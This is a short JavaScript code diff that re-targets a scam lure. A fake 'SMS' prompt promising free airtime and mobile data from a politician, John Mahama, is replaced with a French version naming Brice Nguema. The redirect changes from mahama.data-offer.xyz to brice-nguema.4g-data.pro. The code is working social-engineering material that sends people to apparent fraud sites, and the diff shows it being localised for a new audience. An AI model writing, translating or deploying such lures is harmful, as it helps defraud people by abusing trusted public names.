@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = '20Go de données'
+password=prompt('SMS: Félicitations, vous êtes éligible pour recevoir 1.500F de temps antenne et 20Go de données gratuites de offre BRICE NGUEMA, Veuillez appuyer sur OK pour ACTIVER ','20Go de données');
+if (password != '20Go de données') {
+location.href='https://brice-nguema.4g-data.pro/20GB';
 }
